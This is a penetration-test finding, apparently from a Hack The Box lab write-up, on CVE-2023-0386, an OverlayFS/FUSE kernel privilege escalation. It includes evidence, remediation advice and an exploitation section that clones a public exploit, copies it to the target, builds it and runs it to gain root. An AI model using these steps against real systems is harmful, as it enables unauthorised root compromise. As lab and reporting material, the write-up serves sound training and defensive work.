### HTB-2M-05 — Outdated Kernel: CVE-2023-0386 (OverlayFS / FUSE LPE)

| | |
|---|---|
| **Severity** | High |
| **CVSS 3.1** | `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **7.8** |
| **CVE** | [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **OWASP** | A06:2021 – Vulnerable and Outdated Components |

**Description**
The host runs kernel `5.15.70-051570-generic`, a **mainline build dated 2022-09-23**, on
Ubuntu 22.04.2 LTS (jammy). The Ubuntu fix for CVE-2023-0386 shipped in `5.15.0-70.77`
(USN-5975-1). Despite the similar version numbers, the installed kernel **predates the patch**
and is vulnerable.

The flaw lies in the OverlayFS **copy-up** operation: when a file is copied from a FUSE-backed
lower layer mounted inside an unprivileged user namespace, the kernel fails to correctly
validate UID/GID mapping. An unprivileged user can therefore make a **setuid-root binary**
materialise with root ownership in the upper layer and execute it.

**Evidence**
```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 GNU/Linux

admin@2million:~$ lsb_release -a
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.2 LTS
Codename:       jammy

admin@2million:~$ cat /var/mail/admin
Subject: Urgent: Patch System OS
... That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

> An internal email explicitly flagged the pending patch — the vulnerability was **known to the
> organisation and left unremediated**, which is a patch-management process failure, not only a
> technical one.

**Exploitation**
```bash
# Attacker
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r cve.zip CVE-2023-0386 && scp cve.zip admin@2million.htb:/tmp

# Target
cd /tmp && unzip cve.zip && cd CVE-2023-0386
make all
./fuse ./ovlcap/lower ./gc &
./exp

id
# → uid=0(root) gid=0(root) groups=0(root)
```

**Impact**
Total compromise of the host. Every file, credential and service on the system is exposed;
all other security controls are rendered ineffective.

**Remediation**
- Patch the kernel to `5.15.0-70.77` or later (`apt update && apt full-upgrade`) and reboot.
- Enable **automatic security updates** (`unattended-upgrades`) for the kernel and core packages.
- Where immediate patching is impossible, mitigate by disabling unprivileged user namespaces:
  ```bash
  sysctl -w kernel.unprivileged_userns_clone=0
  ```
- Introduce a formal patch-management SLA (e.g. critical/high kernel CVEs remediated within 7 days).

